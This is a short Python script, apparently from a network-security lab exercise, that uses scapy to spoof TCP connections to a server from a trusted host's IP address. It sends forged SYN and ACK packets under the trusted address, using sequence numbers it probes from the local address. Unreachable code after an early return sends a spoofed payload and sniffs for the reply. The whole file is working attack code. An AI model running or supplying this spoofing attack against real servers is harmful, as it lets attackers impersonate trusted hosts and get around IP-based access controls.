from scapy.all import *


def main(args):
  localip = args[0]
  serverip = args[1]
  trustedip = args[2]
  trustedport = 31337
  ip_l = IP(src=localip, dst=serverip)
  ip_t = IP(src=trustedip, dst=serverip)
  seqs = []
  for i in range(0,100):
    sport = random.randint(1024,65535)
    SYN_t = TCP(sport=sport, dport=trustedport, flags='S', seq=1000)
    SYN_l = TCP(sport=sport, dport=trustedport, flags='S', seq=1000)
    send(ip_t/SYN_t, verbose=0)
    SYNACK=sr1(ip_l/SYN_l, verbose=0)
    ACK = TCP(sport=sport, dport=trustedport, flags='A', seq=SYNACK.ack, ack=SYNACK.seq+1)
    send(ip_t/ACK)
    #seqs.append(SYNACK.seq)
  #for s in seqs:
  #  print(s)
  return
  ip = IP(src=trustedip, dst=serverip)
  
  SYN=TCP(sport=sport,dport=int(trustedport),flags='S',seq=0)
  ipsyn = ip/SYN
  (ipsyn).show()
  SYNACK=sr1(ipsyn)
  SYNACK.show()
  ACK=TCP(sport=sport, dport=int(trustedport), flags='A', seq=1, ack=1)
  ipack = ip/ACK
  ipack.show()
  send(ipack)
  
  
  spoof = ip / TCP(sport=sport, dport=trustedport, seq=1, ack=1) / Raw(localip)
  spoof.show()
  fs = "udp and host " + localip + " and port " + str(trustedport)
  send(spoof)
  pkts = sniff(filter=fs, count=1)
  pkts.show()
  
  
if __name__ == "__main__":
  main(sys.argv[1:])
